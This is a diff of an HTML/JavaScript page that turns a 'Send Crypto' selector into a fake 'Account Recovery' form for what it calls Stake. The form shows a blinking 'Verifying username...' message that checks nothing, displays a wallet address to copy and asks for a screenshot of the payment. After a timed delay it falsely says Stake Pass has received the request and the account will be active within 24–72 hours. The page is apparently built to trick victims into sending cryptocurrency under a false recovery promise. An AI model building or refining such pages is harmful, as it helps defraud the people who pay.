@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>ReStakeAccess - Crypto Selector</title>
+  <title>ReStakeAccess - Account Recovery</title>
   <style>
     body {
       margin: 0;
@@ -22,7 +22,7 @@
       border-radius: 10px;
       text-align: center;
       width: 90%;
-      max-width: 400px;
+      max-width: 420px;
     }
     input, select {
       width: 100%;
@@ -47,16 +47,39 @@
       word-break: break-all;
       margin-top: 10px;
       color: #00ffcc;
+      position: relative;
+    }
+    .copy-btn {
+      position: absolute;
+      right: 10px;
+      top: 10px;
+      background: #00f7ff;
+      color: black;
+      border: none;
+      border-radius: 5px;
+      padding: 5px;
+      cursor: pointer;
+    }
+    .verify-animation {
+      margin-top: -5px;
+      font-size: 12px;
+      color: #00ffcc;
+      animation: blink 1s infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.2; }
     }
   </style>
 </head>
 <body>
   <div class="box">
-    <h2>Send Crypto</h2>
-    <input type="text" id="username" placeholder="Enter username" />
+    <h2>Account Recovery</h2>
+    <input type="text" id="username" placeholder="Enter username" oninput="checkSubmit()" />
+    <div class="verify-animation">🔄 Verifying username...</div>
 
     <label for="coin">Select Coin:</label>
-    <select id="coin" onchange="updateNetworkOptions()">
+    <select id="coin" onchange="updateNetworkOptions(); checkSubmit()">
       <option value="">-- Select Coin --</option>
       <option value="USDT">USDT</option>
       <option value="BTC">BTC</option>
@@ -65,13 +88,19 @@
     </select>
 
     <label for="network">Select Network:</label>
-    <select id="network" onchange="showAddress()">
+    <select id="network" onchange="showAddress(); checkSubmit()">
       <option value="">-- Select Network --</option>
     </select>
 
-    <div id="address" class="address-box" style="display: none;"></div>
+    <div id="address" class="address-box" style="display: none;">
+      <span id="wallet-address"></span>
+      <button class="copy-btn" onclick="copyAddress()">Copy</button>
+    </div>
 
-    <button class="btn" onclick="verify()">Verify Username</button>
+    <label for="screenshot">Upload Transaction Screenshot:</label>
+    <input type="file" id="screenshot" accept="image/*" onchange="checkSubmit()" />
+
+    <button class="btn" id="submitBtn" onclick="submitForm()" disabled>Submit</button>
     <p id="status"></p>
   </div>
 
@@ -97,11 +126,8 @@
       const coin = document.getElementById("coin").value;
       const networkSelect = document.getElementById("network");
       const addressDiv = document.getElementById("address");
-
-      // Reset
       networkSelect.innerHTML = '<option value="">-- Select Network --</option>';
       addressDiv.style.display = 'none';
-
       if (coin && addressMap[coin]) {
         const networks = Object.keys(addressMap[coin]);
         networks.forEach(network => {
@@ -116,38 +142,37 @@
     function showAddress() {
       const coin = document.getElementById("coin").value;
       const network = document.getElementById("network").value;
-      const addressDiv = document.getElementById("address");
-
+      const addressBox = document.getElementById("address");
+      const addressSpan = document.getElementById("wallet-address");
       if (coin && network && addressMap[coin][network]) {
-        addressDiv.innerText = addressMap[coin][network];
-        addressDiv.style.display = "block";
+        addressSpan.innerText = addressMap[coin][network];
+        addressBox.style.display = "block";
       } else {
-        addressDiv.style.display = "none";
+        addressBox.style.display = "none";
       }
     }
 
-    function verify() {
+    function copyAddress() {
+      const address = document.getElementById("wallet-address").innerText;
+      navigator.clipboard.writeText(address).then(() => {
+        alert("Address copied to clipboard!");
+      });
+    }
+
+    function checkSubmit() {
       const username = document.getElementById("username").value.trim();
       const coin = document.getElementById("coin").value;
       const network = document.getElementById("network").value;
-      const address = addressMap[coin]?.[network];
+      const screenshot = document.getElementById("screenshot").files.length > 0;
+      document.getElementById("submitBtn").disabled = !(username && coin && network && screenshot);
+    }
+
+    function submitForm() {
       const status = document.getElementById("status");
-
-      if (!username || !coin || !network || !address) {
-        status.innerHTML = "⚠️ Please fill all fields correctly.";
-        status.style.color = "orange";
-        return;
-      }
-
-      status.innerHTML = "Verifying...";
+      status.innerHTML = "Submitting...";
       status.style.color = "white";
-
       setTimeout(() => {
-        status.innerHTML = `
-          ✅ <b>${username}</b> verified for:<br>
-          <b>${coin} on ${network}</b><br>
-          <small style="color:#00ff99">${address}</small>
-        `;
+        status.innerHTML = "✅ This account recovery request has been received by Stake Pass. Your Stake account will be fully active within 24 - 72 hours.";
         status.style.color = "#00ff99";
       }, 1500);
     }
